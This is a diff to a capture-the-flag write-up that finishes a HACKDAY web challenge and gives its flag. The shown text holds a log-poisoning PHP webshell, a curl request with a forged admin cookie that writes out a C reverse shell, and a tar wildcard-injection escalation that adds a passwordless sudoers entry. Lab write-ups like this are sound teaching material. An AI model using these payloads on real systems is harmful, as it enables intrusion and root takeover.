@@ -96,7 +96,7 @@ ssh V0VCU0hFTExPSyA8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=@localhost
     
 <h2> Step 3: Launch a revshell to get a stable prompt and perform a privesc to read the flag </h2>
 
-<p align="justify"> Once the webshell was deployed and commands could have been ran on the machine, the final step was to laucnh a revshell to get a stable prompt to finally escalate privileges an read the flag. To do so, the solution was to use libc because netcat was missing and it was a docker so no /dev/tcp folder too. To get a revshell the payload must have been url encoded and sent to server. The payload below can write the reverse shell available under revshell.c in this repo, in the /tmp folder :</p>
+<p align="justify"> Once the webshell was deployed and commands could have been run on the machine, the final step was to laucnh a revshell to get a stable prompt to finally escalate privileges an read the flag. To do so, the solution was to use libc because netcat was missing and it was a docker so no /dev/tcp folder too. To get a revshell the payload must have been url encoded and sent to server. The payload below can write the reverse shell available under revshell.c in this repo, in the /tmp folder :</p>
 
 ````bash
 curl -b "session_token=eyd1c2VybmFtZSc6J2d1ZXN0JywgJ3JvbGUnOidhZG1pbid9./3b1GSdZghQ6flLq0yEjz5fDtnXbRcBItrm20FCyAoI=" http://ip/HiddenAdministrativeControlPanel.php?load=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Duserloginfail.txt&cmd=echo%20%27%23include%20%3Cstdio.h%3E%0A%23include%20%3Csys%2Fsocket.h%3E%0A%23include%20%3Cnetinet%2Fin.h%3E%0A%23include%20%3Carpa%2Finet.h%3E%0A%23include%20%3Cstring.h%3E%0A%23include%20%3Cunistd.h%3E%0A%0A%23define%20IP%20%22127.0.0.1%22%0A%23define%20PORT%2014456%0A%0Aint%20main%28%29%0A%7B%0A%20%20%20%20int%20sockfd%20%3D%20socket%28AF_INET%2C%20SOCK_STREAM%2C%200%29%3B%0A%0A%20%20%20%20struct%20sockaddr_in%20server_addr%3B%0A%20%20%20%20server_addr.sin_family%20%3D%20AF_INET%3B%0A%20%20%20%20server_addr.sin_port%20%3D%20htons%28PORT%29%3B%0A%0A%20%20%20%20inet_pton%28AF_INET%2C%20IP%2C%20%26%28server_addr.sin_addr%29%29%3B%0A%0A%20%20%20%20connect%28sockfd%2C%20%28struct%20sockaddr%20%2A%29%26server_addr%2C%20sizeof%28server_addr%29%29%3B%0A%0A%20%20%20%20dup2%28sockfd%2C%200%29%3B%0A%20%20%20%20dup2%28sockfd%2C%201%29%3B%0A%20%20%20%20dup2%28sockfd%2C%202%29%3B%0A%0A%20%20%20%20execve%28%22%2Fbin%2Fsh%22%2C%200%2C%200%29%3B%0A%0A%20%20%20%20close%28sockfd%29%3B%0A%0A%20%20%20%20return%200%3B%0A%7D%27%20%3E%20%2Ftmp%2Frev2.c%09
@@ -110,14 +110,43 @@ chmod +x /tmp/revshell
 /tmp/revshell
 #then a curl as in the previous command to load it, to grant it execution right and then lauchn it
 ````
-<p align="justify">If no error happended during compilation a revshell might have been received on the listening port opened </p>
+<p align="justify">If no error happended during compilation a revshell might have been received on the listening port opened :</p>
 
 <p align="center">
 <img src="Screenshots/S11.png" style="width: 50%">
 </p>
 
+<p align="justify">At this step the challenge was solved at 90%, the very last step was to find a way to escalate privileges to read the flag. To do so, no SUID or weak permissions/capabilitties but an intteresting crontab in charge of backup /home/user directory and which was run as root. Besided right were granted to adm group, in which user www-data was inlcuded : </p>
+
 <p align="center">
 <img src="Screenshots/S12.png" style="width: 50%">
 </p>
 
+<p align="justify">Indeed this crontab was vulnerable to an exploit named wildcard injection perfectly explained by Ley0x in his blog : <a href="https://blog.ley0x.me/posts/linux-wildcard-injection">Doc here.</a> Actually the binary tar uses flags while running, which can be leveraged to execute arbitrary script, and when tar runs as root it means than command could be potentialy run as root:</p>
+
+ ````bash
+#tar flags
+ --checkpoint[=N]
+            Display progress messages every Nth record (default 10).
+--checkpoint-action=ACTION
+            Run ACTION on each checkpoint.
+````
+
+<p align="justify">Here, the previous tar flags mentioned before revealed useful insofar as their permitted to define a script to run with tar. The following commands could have been run to execute the attack and get an foothold in sudoers users : </p>
+
+````bash
+echo "echo 'www-data  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > /home/user/evil.sh
+chmod +x /home/user/evil.sh
+cd /home/user
+echo "" > --checkpoint=1
+echo "" > "--checkpoint-action=exec=sh evil.sh"
+````
+
+<p align="justify">Finaly after a few minutes the crontab ran, and because of the * user in the backup task; malicious flag ended up included in the command line of the task and the evil.sh script ran. As result it provided a passwordless sudoers user account and after that it was possible to read the flag prefixing cat with sudo : </p>
+
+<p align="center">
+<img src="Screenshots/S13.png">
+</p>
+
+FLAG : HACKDAY{T1m3_B4s3d_4tt4ck_+_L0g_P01s0n_+_W1ldC4rd_1nj3ct10n_=_Pwn3d!!!}
 
